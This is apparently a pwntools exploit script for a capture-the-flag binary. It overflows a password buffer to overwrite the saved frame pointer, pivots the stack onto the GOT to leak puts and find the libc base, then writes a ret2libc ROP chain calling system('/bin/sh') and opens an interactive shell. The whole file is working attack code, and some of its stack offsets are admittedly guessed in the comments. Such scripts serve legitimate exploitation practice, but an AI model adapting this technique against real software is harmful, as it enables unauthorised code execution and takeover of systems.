from pwn import *

# --- Configuration ---
binary_path = './chal'
libc_path = './libc.so.6' # Ensure this is in the same folder

elf = ELF(binary_path)
libc = ELF(libc_path)
context.binary = elf

def start():
    # Use process for local testing
    return process(binary_path)

p = start()

# --- Constants from your Objdump ---
# 4011d7: lea rax,[rbp-0x240]
PRINTF_SETUP_ADDR = 0x4011d7
NAME_OFFSET = 0x240
# Struct is {name[256], pass[OFFSET]}. Pass overflow overwrites RBP.
# pass is at rbp-0x140 (likely), name at rbp-0x240.
# Distance from start of 'pass' to RBP:
# The input buffer 'buffer' is separate. The login logic copies to the struct.
# Based on the challenge source logic, the overflow happens during the COPY.
# strcpy(user.pass, pass);
# We need to calculate the padding exactly.
# If name is at -0x240 and pass is at -0x140 (implied by struct order).
# The saved RBP is at offset 0.
# Distance from pass start to RBP = 0x140 = 320 bytes.
OFFSET_TO_RBP = 0x140 

# --- Stage 1: Stack Pivot & Leak ---
print("[-] Stage 1: Pivoting Stack to GOT")

# 1. Construct Login Payload
# We want to overwrite the Saved RBP with (GOT_ADDRESS + NAME_OFFSET)
# So that [RBP - NAME_OFFSET] = GOT_ADDRESS.
fake_rbp = elf.got['puts'] + NAME_OFFSET

# Payload: [Padding to RBP] + [Fake RBP] + [Return to Printf Setup]
# Note: The initial login string is parsed. We need "name:pass".
# name='a'. pass=payload.
payload_1 = flat(
    b'A' * OFFSET_TO_RBP,
    fake_rbp,
    PRINTF_SETUP_ADDR
)

# Send login. 
# The 'pass' check allows len < 768. Our payload is ~336 bytes. Safe.
p.sendlineafter(b'login information: ', b'a:' + payload_1)

# 2. Parse Leak
# The program jumps to 4011d7, prints user.name (which is now puts@got),
# then continues into the loop.
print("[-] Waiting for leak...")
try:
    # It prints "Hello " then the leak then "!\n"
    p.recvuntil(b'Hello ')
    leak_raw = p.recvline()[:-2] # Strip '!\n'
    
    # Pad leak to 8 bytes
    leak_addr = u64(leak_raw.ljust(8, b'\0'))
    print(f"[+] Leaked puts: {hex(leak_addr)}")
    
    libc.address = leak_addr - libc.symbols['puts']
    print(f"[+] Libc Base: {hex(libc.address)}")
    
except EOFError:
    print("[!] Crash/EOF. Offset to RBP might be wrong.")
    # Debug hint: If this fails, try OFFSET_TO_RBP = 256 (0x100)
    sys.exit(1)

# --- Stage 2: ROP to Shell ---
print("[-] Stage 2: Writing ROP Chain via 'New Name'")

# We are now inside the 'vuln' loop.
# The stack pointer (RSP) is valid, but RBP points to BSS (GOT area).
# When we exit the function (Option 3), it will execute:
# leave (mov rsp, rbp; pop rbp) -> RSP becomes Fake_RBP (GOT+0x240)
# ret -> Pops RIP from [GOT+0x248]
# So we need to write our ROP chain at GOT+0x248.

# We can do this using Option 1 (Change Name).
# The code does: fgets(user.name, strlen(user.name)+1, stdin)
# user.name is currently at [RBP-0x240] = GOT.
# The GOT contains pointers, so strlen is large! We can write past the GOT entries
# all the way to GOT+0x248.

# 1. Select Option 1
p.sendline(b'1')

# 2. Build ROP Chain
rop = ROP(libc)
bin_sh = next(libc.search(b'/bin/sh'))
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

rop_chain = flat(
    ret_gadget,      # Align stack
    pop_rdi,
    bin_sh,
    libc.symbols['system']
)

# 3. Construct Payload for 'New Name'
# We need to pad from user.name (GOT start) up to the return address (GOT+0x248)
# Distance = 0x248 bytes.
padding_to_ret = 0x248

payload_2 = flat(
    b'B' * padding_to_ret, # Pad through GOT/BSS to the return address
    rop_chain
)

print("[-] Sending ROP chain...")
p.sendlineafter(b'New name: ', payload_2)

# 4. Trigger Exit
# This executes 'leave; ret', pivoting RSP to our ROP chain at GOT+0x248
p.sendline(b'3')

print("[*] Enjoy your shell!")
p.interactive()
